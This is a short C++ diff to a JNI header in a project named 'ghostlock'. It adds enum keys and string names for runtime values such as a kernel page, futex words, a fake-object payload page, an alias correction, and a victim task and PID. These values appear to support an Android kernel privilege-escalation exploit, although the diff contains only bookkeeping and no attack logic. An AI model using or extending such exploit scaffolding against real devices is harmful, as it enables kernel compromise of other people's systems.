@@ -165,6 +165,16 @@ namespace ghostlock::jni {
         Secret = 35,     /**< bytes: the credentials frame; cleared by both ends after use. */
         Image = 36,      /**< bytes: an image this build carries. */
         CountKey = 37,   /**< not a key: the first value outside the table. */
+        /* ---- 运行期事实（Prepare/Discover/SpawnVictim 发布，Kotlin 读） ---- */
+        PageBase = 40,   /**< u64: the prepared kernel page. */
+        Word0 = 41,      /**< u64: the first futex word the window parks on. */
+        Word1 = 42,      /**< u64: the second futex word, the one the arm aims at. */
+        PayloadPage = 43,/**< u64: the page the fake objects were written into. */
+        PayloadBase = 44,/**< u64: where the payload region starts. */
+        AliasDelta = 45, /**< u64: the direct-map alias correction the write needs. */
+        Found = 46,      /**< u64: the address the search accepted. */
+        VictimTask = 47, /**< u64: the victim task the write aims at. */
+        VictimPid = 48,  /**< u64: the victim process. */
     };
 
     /** The one spelling of a key name; the manifest exports exactly this table. */
@@ -196,6 +206,15 @@ namespace ghostlock::jni {
             case FrameKey::Secret: return "secret";
             case FrameKey::Image: return "image";
             case FrameKey::CountKey: break;
+            case FrameKey::PageBase: return "page_base";
+            case FrameKey::Word0: return "word0";
+            case FrameKey::Word1: return "word1";
+            case FrameKey::PayloadPage: return "payload_page";
+            case FrameKey::PayloadBase: return "payload_base";
+            case FrameKey::AliasDelta: return "alias_delta";
+            case FrameKey::Found: return "found";
+            case FrameKey::VictimTask: return "victim_task";
+            case FrameKey::VictimPid: return "victim_pid";
         }
         return "unknown";
     }
